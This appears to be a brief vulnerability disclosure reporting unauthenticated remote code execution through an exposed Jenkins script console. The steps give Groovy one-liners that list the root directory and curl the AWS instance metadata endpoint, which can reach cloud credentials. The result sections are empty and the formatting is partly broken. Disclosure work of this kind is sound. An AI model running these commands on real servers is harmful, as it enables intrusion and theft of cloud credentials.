# RCE on Jenkins
The Jenkins instance running at $URL has the script function enabled  publicly. 

## Steps To Reproduce

Go to $URL

Run the following commands:

``ls /".execute().text``

This lists the content of the folder.


```
## Result


```

But now let's do something worse. Let's get the AWS metadata server:

```"curl http://169.254.169.254/latest/meta-data/h".execute().text 	

## Result

Result: 
```



## Impact

An unauthenticated, 3rd-party attacker or adversary can execute remote code.
 
### Supporting Material/References
https://hackerone.com/reports/403402
